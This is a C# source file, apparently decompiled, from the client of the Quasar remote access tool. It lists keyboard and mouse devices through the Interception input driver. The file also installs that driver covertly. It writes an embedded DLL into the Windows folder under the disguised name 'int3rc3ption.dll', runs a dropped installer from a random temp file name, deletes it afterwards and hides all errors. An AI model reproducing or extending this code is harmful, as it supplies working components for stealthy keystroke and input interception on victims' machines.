using Quasar.Client.Properties;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

using Quasar.Client.Utilities;

namespace Quasar.Client.Interception
{
    public class InterceptionHelper
    {
        // Token: 0x060005CD RID: 1485 RVA: 0x00014C68 File Offset: 0x00012E68
        private static string FixString(byte[] data)
        {
            int num = 0;
            while (num + 1 < data.Length)
            {
                if (data[num] == data[num + 1] && data[num] == 0)
                {
                    return Encoding.Unicode.GetString(data, 0, num);
                }
                num += 2;
            }
            return string.Empty;
        }

        // Token: 0x060005CE RID: 1486 RVA: 0x00014CA8 File Offset: 0x00012EA8
        public static string BuildDeviceName(bool isMouse, int id, string name)
        {
            return string.Format("{0}:{1}:{2}", isMouse ? "M" : "K", id, name);
        }

        // Token: 0x060005CF RID: 1487 RVA: 0x00014CCC File Offset: 0x00012ECC
        public static string[] GetDeviceList()
        {
            List<string> list = new List<string>();
            IntPtr context = InterceptionDriver.CreateContext();
            for (int i = 0; i <= 20; i++)
            {
                if (InterceptionDriver.IsInvalid(i) == 0)
                {
                    byte[] array = new byte[1024];
                    GCHandle gchandle = GCHandle.Alloc(array, GCHandleType.Pinned);
                    IntPtr hardwareIdentifier = gchandle.AddrOfPinnedObject();
                    if (InterceptionDriver.GetHardwareId(context, i, hardwareIdentifier, (uint)array.Length) > 0)
                    {
                        list.Add(BuildDeviceName(InterceptionDriver.IsMouse(i) != 0, i, FixString(array)));
                    }
                    gchandle.Free();
                }
            }
            InterceptionDriver.DestroyContext(context);
            return list.ToArray();
        }

        // Token: 0x060005D0 RID: 1488 RVA: 0x00014D54 File Offset: 0x00012F54
        public static bool IsInterceptionInstalled()
        {
            bool result;
            try
            {
                IntPtr intPtr = InterceptionDriver.CreateContext();
                if (intPtr == IntPtr.Zero)
                {
                    result = false;
                }
                else
                {
                    InterceptionDriver.DestroyContext(intPtr);
                    result = true;
                }
            }
            catch (Exception)
            {
                result = false;
            }
            return result;
        }

        // Token: 0x060005D1 RID: 1489 RVA: 0x00014D98 File Offset: 0x00012F98
        public static void InstallInterception(out bool alreadyInstalled, out string stdout, out string stderr)
        {
            stdout = "";
            stderr = "";
            if (InterceptionHelper.IsInterceptionInstalled())
            {
                alreadyInstalled = true;
                return;
            }
            alreadyInstalled = false;
            try
            {
                File.WriteAllBytes("C:\\Windows\\int3rc3ption.dll", IntPtr.Size==8 ? Resource1.interception_x64 : Resource1.interception_x86);
            }
            catch (Exception)
            {
            }
            string text = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
            try
            {
                File.WriteAllBytes(text, Resource1.install_interception);
            }
            catch (Exception)
            {
            }
            Misc.CheckOutput(text, "/install", out stdout, out stderr);
            try
            {
                File.Delete(text);
            }
            catch (Exception)
            {
            }
        }

        // Token: 0x060005D2 RID: 1490 RVA: 0x00014E50 File Offset: 0x00013050
        public static void UninstallInterception(out bool alreadyUninstalled, out string stdout, out string stderr)
        {
            stdout = "";
            stderr = "";
            if (!IsInterceptionInstalled())
            {
                alreadyUninstalled = true;
                return;
            }
            alreadyUninstalled = false;
            string text = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
            try
            {
                File.WriteAllBytes(text, Resource1.install_interception);
            }
            catch (Exception)
            {
            }
            Misc.CheckOutput(text, "/uninstall", out stdout, out stderr);
            try
            {
                File.Delete(text);
            }
            catch (Exception)
            {
            }
        }
    }

}
